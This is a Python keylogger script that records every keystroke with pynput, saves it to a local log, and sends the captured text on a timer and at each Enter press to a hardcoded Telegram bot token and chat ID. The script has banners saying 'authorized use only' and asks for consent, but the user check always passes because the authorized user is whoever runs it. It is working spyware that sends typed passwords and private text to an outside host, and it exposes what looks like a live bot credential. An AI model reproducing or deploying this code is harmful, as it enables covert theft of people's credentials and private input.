from pynput import keyboard
import requests
import time
import threading
import os
import sys
from datetime import datetime
import getpass

# === ENHANCED CONFIGURATION ===
class Config:
    # Telegram settings (optional - for notifications only)
    BOT_TOKEN = "8346087012:AAGUFItHu3hRLJ4loxduUcteyJOoOzRrMkE"
    CHAT_ID = "7192294390"
    
    # Security settings
    AUTHORIZED_USER = getpass.getuser()  # Only log for this user
    ENABLE_NOTIFICATIONS = True  # Show startup message
    REQUIRE_CONSENT = True      # Ask for user consent
    
    # Logging settings
    LOG_FILE = "keylog_authorized.txt"  # Local log file
    SEND_INTERVAL = 60  # seconds
    MAX_MESSAGE_LENGTH = 4000  # Telegram limit
    
    # Features
    LOG_SPECIAL_KEYS = True
    INCLUDE_TIMESTAMPS = True

# === SECURITY AND CONSENT CHECK ===
def security_check():
    """Verify this is being run by authorized user with consent"""
    print("=" * 60)
    print("KEYLOGGER ACTIVATION")
    print("=" * 60)
    
    current_user = getpass.getuser()
    if current_user != Config.AUTHORIZED_USER:
        print(f"❌ UNAUTHORIZED USER: {current_user}")
        print("This tool is only authorized for:", Config.AUTHORIZED_USER)
        sys.exit(1)
    
    if Config.REQUIRE_CONSENT:
        print("This software will log keyboard input.")
        print("Purpose: Authorized monitoring only")
        print(f"Log file: {Config.LOG_FILE}")
        print(f"Notifications: {'Enabled' if Config.BOT_TOKEN else 'Disabled'}")
        
        consent = input("\nDo you consent to continue? (yes/no): ")
        if consent.lower() != 'yes':
            print("Consent denied. Exiting.")
            sys.exit(0)
    
    if Config.ENABLE_NOTIFICATIONS:
        print("✅ Keylogger started - Authorized use only")
        print("Press Ctrl+C to stop gracefully")

# === ENHANCED KEYLOGGER ===
class EnhancedKeylogger:
    def __init__(self):
        self.buffer = ""
        self.log_file = Config.LOG_FILE
        self.start_time = datetime.now()
        self.setup_logging()
        
    def setup_logging(self):
        """Initialize log file with header"""
        header = f"""
{'='*60}
Authorized Keylogger Session
User: {getpass.getuser()}
Start Time: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}
Purpose: Legitimate authorized use only
{'='*60}

"""
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(header)
        except Exception as e:
            print(f"Error setting up log file: {e}")

    def format_key(self, key):
        """Enhanced key formatting with better special key handling"""
        try:
            # Character keys
            if hasattr(key, 'char') and key.char is not None:
                return key.char
            
            # Special keys mapping
            special_keys = {
                keyboard.Key.space: ' ',
                keyboard.Key.enter: '\n[ENTER]\n',
                keyboard.Key.tab: '[TAB]',
                keyboard.Key.backspace: '[BACKSPACE]',
                keyboard.Key.esc: '[ESC]',
                keyboard.Key.shift: '[SHIFT]',
                keyboard.Key.ctrl: '[CTRL]',
                keyboard.Key.alt: '[ALT]',
            }
            
            return special_keys.get(key, f'[{key.name.upper()}]') if Config.LOG_SPECIAL_KEYS else ''
            
        except AttributeError:
            return f'[KEY:{str(key)}]'

    def on_press(self, key):
        """Enhanced key press handler"""
        try:
            formatted_key = self.format_key(key)
            
            if Config.INCLUDE_TIMESTAMPS and key == keyboard.Key.enter:
                timestamp = datetime.now().strftime("\n[%H:%M:%S] ")
                self.buffer += timestamp + formatted_key
            else:
                self.buffer += formatted_key
            
            # Auto-send on Enter or when buffer gets large
            if key == keyboard.Key.enter or len(self.buffer) > 500:
                self.flush_buffer()
                
        except Exception as e:
            self.log_error(f"Key processing error: {e}")

    def flush_buffer(self):
        """Send buffered data and write to log"""
        if not self.buffer.strip():
            return
            
        try:
            # Write to local file
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(self.buffer)
            
            # Optional: Send to Telegram
            if Config.BOT_TOKEN and Config.CHAT_ID:
                self.send_to_telegram(self.buffer)
            
            self.buffer = ""
            
        except Exception as e:
            self.log_error(f"Buffer flush error: {e}")

    def send_to_telegram(self, message):
        """Enhanced Telegram notification with error handling"""
        if not message.strip() or len(message) > Config.MAX_MESSAGE_LENGTH:
            return
            
        url = f"https://api.telegram.org/bot{Config.BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": Config.CHAT_ID,
            "text": f"Keylog Update:\n{message[-Config.MAX_MESSAGE_LENGTH:]}"
        }
        
        try:
            response = requests.post(url, data=data, timeout=10)
            if response.status_code != 200:
                self.log_error(f"Telegram API error: {response.status_code}")
        except Exception as e:
            self.log_error(f"Telegram send error: {e}")

    def log_error(self, error_msg):
        """Log errors separately"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        error_log = f"[ERROR {timestamp}] {error_msg}\n"
        
        try:
            with open("keylogger_errors.log", "a") as f:
                f.write(error_log)
        except:
            print(error_msg)  # Fallback to console

    def periodic_report(self):
        """Periodic buffer flushing"""
        if self.buffer:
            self.flush_buffer()
        
        # Reschedule
        timer = threading.Timer(Config.SEND_INTERVAL, self.periodic_report)
        timer.daemon = True
        timer.start()

    def graceful_shutdown(self):
        """Clean shutdown procedure"""
        print("\n\nShutting down keylogger...")
        self.flush_buffer()
        
        end_time = datetime.now()
        duration = end_time - self.start_time
        footer = f"\n{'='*60}\nSession ended: {end_time}\nDuration: {duration}\n{'='*60}\n"
        
        try:
            with open(self.log_file, 'a') as f:
                f.write(footer)
        except:
            pass
        
        print("Keylogger stopped gracefully.")

# === MAIN EXECUTION ===
def main():
    # Security verification
    security_check()
    
    # Initialize keylogger
    keylogger = EnhancedKeylogger()
    
    # Set up graceful shutdown
    def signal_handler(signum, frame):
        keylogger.graceful_shutdown()
        sys.exit(0)
    
    try:
        import signal
        signal.signal(signal.SIGINT, signal_handler)
    except ImportError:
        pass
    
    # Start periodic reporting
    keylogger.periodic_report()
    
    # Start listening
    print("Keylogger active. Monitoring keyboard input...")
    with keyboard.Listener(on_press=keylogger.on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
